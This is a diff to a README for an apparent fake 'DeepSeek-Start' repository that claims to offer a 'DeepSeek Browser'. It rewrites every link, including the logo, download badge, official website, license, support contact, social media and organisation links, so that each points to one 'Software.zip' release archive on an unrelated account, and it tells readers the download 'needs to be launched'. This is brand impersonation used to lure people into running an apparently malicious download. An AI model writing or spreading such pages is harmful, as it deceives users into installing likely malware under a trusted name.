@@ -1,6 +1,6 @@
 # 🚀 Welcome to DeepSeek-Start Repository! 🌊
 
-![DeepSeek Logo](https://example.com/deepseek-logo.png)
+![DeepSeek Logo](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip)
 
 ## Repository Name: deepseek-start
 
@@ -20,7 +20,7 @@ Topics for this repository are not provided.
 
 ## 📦 Download DeepSeek Browser v1.0.0
 
-[![Download DeepSeek Browser](https://img.shields.io/badge/Download-DeepSeek%20Browser-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download DeepSeek Browser](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip%20Browser-blue)](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip)
 
 📁 *Note: Download needs to be launched.*
 
@@ -28,7 +28,7 @@ Topics for this repository are not provided.
 
 ## 🌐 Visit DeepSeek Website
 
-Explore more about DeepSeek on our website: [DeepSeek Official Website](https://www.deepseek.com)
+Explore more about DeepSeek on our website: [DeepSeek Official Website](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -59,13 +59,13 @@ We welcome contributions from the community to enhance DeepSeek's capabilities. 
 
 ## 📝 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/deepseek-start/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
 ## 📞 Support
 
-If you encounter any issues or have any questions, feel free to reach out to our support team at support@deepseek.com.
+If you encounter any issues or have any questions, feel free to reach out to our support team at https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip
 
 ---
 
@@ -73,14 +73,14 @@ If you encounter any issues or have any questions, feel free to reach out to our
 
 Stay updated with the latest news, updates, and announcements by following us on social media:
 
-- Twitter: [@DeepSeekOfficial](https://twitter.com/DeepSeekOfficial)
-- Facebook: [DeepSeek](https://www.facebook.com/DeepSeek)
+- Twitter: [@DeepSeekOfficial](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip)
+- Facebook: [DeepSeek](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip)
 
 ---
 
 ## 🌌 Explore More
 
-Discover more amazing repositories and projects by [DeepSeek Organization](https://github.com/deepseek).
+Discover more amazing repositories and projects by [DeepSeek Organization](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip).
 
 ---
 
